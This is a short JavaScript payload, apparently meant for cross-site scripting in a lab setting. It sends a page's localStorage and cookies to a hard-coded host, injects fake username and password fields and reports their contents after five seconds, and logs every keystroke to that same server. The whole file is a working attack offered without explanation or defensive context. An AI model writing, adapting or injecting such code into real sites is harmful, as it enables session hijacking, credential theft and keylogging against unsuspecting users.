let server = "http://192.168.45.156";

// Exfiltrate local storage and cookies
let exfilData = (key, value) => fetch(`${server}/exfil?${key}=${encodeURIComponent(value)}`);
exfilData("data", JSON.stringify(localStorage));
exfilData("data", document.cookie);

// Create input fields for username and password
let body = document.getElementsByTagName("body")[0];
["text", "password"].forEach(type => {
  let input = document.createElement("input");
  input.type = type;
  input.style.position = "fixed";
  // input.style.opacity = "0";
  body.append(input);
});

// Capture username and password after 5 seconds
setTimeout(() => {
  let inputs = document.getElementsByTagName("input");
  fetch(`${server}/k?u=${inputs[0].value}&p=${inputs[1].value}`);
}, 5000);

// Log keystrokes
function logKey(event) {
  fetch(`${server}/k?key=${event.key}`);
}
document.addEventListener('keydown', logKey);
